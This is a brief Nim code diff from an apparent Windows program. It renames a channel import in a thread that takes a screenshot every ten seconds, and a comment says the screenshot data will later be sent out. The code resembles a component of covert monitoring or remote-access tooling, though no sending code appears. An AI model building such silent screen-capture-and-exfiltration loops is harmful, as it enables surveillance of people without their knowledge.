@@ -33,7 +33,7 @@ from winim/inc/wingdi import BI_RGB
 
 import ../functions/encodeImageBytes
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 proc newImageData(width: int32, height: int32): ImageData =
   result = ImageData()
@@ -94,7 +94,7 @@ proc initScreenshotThread*(): void {.thread.} =
   while true:
     # when sendThread is implemented this will send
     # the screenshot data
-    mainThread.send "took screenshot"
+    mainChannel.send "took screenshot"
     discard screenshot()
 
     sleep(10000) # sleep 10s
